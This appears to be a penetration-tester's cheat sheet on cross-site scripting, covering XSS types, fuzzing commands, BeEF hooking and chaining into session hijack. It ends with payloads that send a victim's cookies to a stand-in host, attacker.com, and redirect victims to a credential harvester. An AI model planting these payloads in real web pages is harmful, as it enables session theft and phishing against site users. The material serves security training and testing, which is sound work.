# Cross Site Scripting

## Things to remember
  *  PayloadsAllTheThings contains tons of [XSS payloads and filter bypass techniques](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
  *  Descriptions summarized from [OWASP XSS page](https://owasp.org/www-community/attacks/xss/)
  *  Reflected XSS coerces the victim browser to send the payload to the server
      *  The server "reflects" the payload back to the browser
      *  e.g. Specially crafted links, redirects, etc.
  *  Stored XSS involves storing the payload on the server
      *  Affects any user that visits the page containing the payload

## Useful tools
  *  [`wfuzz`](https://www.kali.org/tools/wfuzz/) and [`ffuf`](https://github.com/ffuf/ffuf) for manually fuzzing web app inputs for XSS
  *  [`seclists`](https://github.com/danielmiessler/SecLists) for some command injection fuzzing lists
  *  [`BeEF`](https://beefproject.com/) for hooking/controlling/exploiting browsers

## Fuzzing for XSS
  *  `wfuzz` and `ffuf` for XSS fuzzing
      *  Fuzz more than just parameters! Cookies, headers, etc.
  *  Carefully parse HTTP POST requests before using `wfuzz`
      *  Be specific with things like cookies, headers, URL structure, etc.
      *  Failing to provide these values can produce ineffective requests
  *  `ffuf` can parse requests from text files
      *  Easier handling of more complex POST requests
      *  No recursive grep, consider `Burp Intruder` in these cases
  *  Plenty of XSS wordlists available in `seclists`

```
wfuzz -w /path/to/xss.txt -b 'exampleCookie=cookieValue' 'http://10.0.0.1/xss?param=FUZZ'
wfuzz -w /path/to/xss.txt -H 'exampleHeader: headerValue' -d 'param=FUZZ' 'http://10.0.0.1/xss'
```

```
ffuf -request req.txt --request-proto http -w /path/to/xss.txt -v
```

## Exploiting XSS
  *  Implant `BeEF` hooks to leverage XSS into browser control
  *  Consider chaining XSS into various client-side attacks
      *  Browser exploit, harvester implant/redirect, drive-by download, etc.
  *  Consider chaining XSS into session hijack by stealing cookies/tokens
      *  PayloadsAllTheThings has a list of [payloads for cookie/token theft](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#data-grabber-for-xss)
  *  Consider leveraging XSS to "view" web pages as the victim user
      *  Useful in situations where token/cookie theft is not possible
      *  Send request to target page, b64 encode response, send b64 blob to attacker server

```
<img src="http://attacker.com/" />
<script>new Image().src="http://attacker.com/"+document.cookie;</script>
<script>window.location.href="http://attacker.com/harvester";</script>
```
